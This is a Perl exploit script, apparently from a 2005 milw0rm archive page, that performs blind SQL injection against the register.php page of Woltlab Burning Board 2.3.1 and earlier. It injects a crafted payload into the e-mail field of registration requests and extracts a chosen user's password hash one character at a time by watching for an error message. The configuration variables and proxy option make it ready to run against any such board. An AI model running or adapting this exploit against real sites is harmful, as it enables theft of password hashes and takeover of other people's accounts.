<html><head><title>Woltlab Burning Board <= 2.3.1 register.php SQL-Injection Exploit</title></head><pre>#!/usr/bin/perl

use strict;
use IO::Socket::INET;


$| = print &quot;
Woltlab Burning Board &lt;= 2.3.1 Exploit
Vulnerability discovered by GulfTech Security Research
Visit www.security-project.org
Exploit by deluxe89
----------
&quot;;



my $host = 'www.security-project.org';
my $path = '/wbb2/'; # path to the board
my $userid = 1; # the password hash will be from the user with this id
my $username = 'deluxe89'; # any username from the board
my $proxy = ''; # proxy, you can leave this empty
my $error = 'E-Mail-Adresse ist unzul&amp;auml;ssig'; # use 'email address entered is already ta' for english boards


# proxy handling
my ($addr, $port) = ($proxy ne '') ? split(/:/, $proxy) : ($host, 80);
if($proxy ne '')
{
       print &quot;[~] Using a proxy\n&quot;;
}
else
{
       print &quot;[~] You're using NO proxy!\n&quot;;
       sleep(1);
}





#
# Get the hash
#

print &quot;[~] Getting the hash. Please wait some minutes..\n[+] Hash: &quot;;


my $hash = '';
for(my $i=1;$i&lt;33;$i++)
{
       my $sock = new IO::Socket::INET(PeerAddr =&gt; $addr, PeerPort =&gt; $port, Proto =&gt; 'tcp', Timeout =&gt; 8) or die('[-] Could not connect to server');

       if(&amp;test($i, 96)) # buchstabe
       {
               for(my $c=97;$c&lt;103;$c++)
               {
                       if(&amp;test($i, $c, 1))
                       {
                               print pack('c', $c);
                               last;
                       }
               }
       }
       else # zahl
       {
               #print &quot;0-4\n&quot;;
               for(my $c=48;$c&lt;58;$c++)
               {
                       if(&amp;test($i, $c, 1))
                       {
                               print pack('c', $c);
                               last;
                       }
               }
       }
}
print &quot;\n&quot;;


sub test
{
       my ($i, $num, $g) = @_;

       my $sock = new IO::Socket::INET(PeerAddr =&gt; $addr, PeerPort =&gt; $port, Proto =&gt; 'tcp', Timeout =&gt; 8) or die('Could not connect to server');
       my $value = &quot;sre4sdffr\@4g54asd5.org' OR (userid=$userid AND ascii(substring(password,$i,1))&quot;;
       $value .= ($g) ? '=' : '&gt;';
       $value .= &quot;$num)/*&quot;;
       my $data = &quot;r_username=$username&amp;r_email=$value&amp;r_password=aaaaaaaa&amp;r_confirmpassword=aaaaaaaa&amp;r_homepage=&amp;r_icq=&amp;r_aim=&amp;r_yim=&amp;r_msn=&amp;r_day=0&amp;r_month=0&amp;r_year=&amp;r_gender=0&amp;r_signature=&amp;r_usertext=&amp;field%5B1%5D=&amp;field%5B2%5D=&amp;field%5B3%5D=&amp;r_invisible=0&amp;r_usecookies=1&amp;r_admincanemail=1&amp;r_showemail=1&amp;r_usercanemail=1&amp;r_emailnotify=0&amp;r_notificationperpm=0&amp;r_receivepm=1&amp;r_emailonpm=0&amp;r_pmpopup=0&amp;r_showsignatures=1&amp;r_showavatars=1&amp;r_showimages=1&amp;r_daysprune=0&amp;r_umaxposts=0&amp;r_threadview=0&amp;r_dateformat=d.m.Y&amp;r_timeformat=H%3Ai&amp;r_startweek=1&amp;r_timezoneoffset=1&amp;r_usewysiwyg=0&amp;r_styleid=0&amp;r_langid=0&amp;send=send&amp;sid=&amp;disclaimer=viewed&quot;;

       print $sock &quot;POST http://$host${path}register.php HTTP/1.1\r\nHost: $host\r\nConnection: Close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: &quot;.length($data).&quot;\r\n\r\n$data\r\n&quot;;


       while(&lt;$sock&gt;)
       {
               if($_ =~ m/$error/) { return 1; }
       }
       return 0;
}

# milw0rm.com [2005-05-20]</pre></html>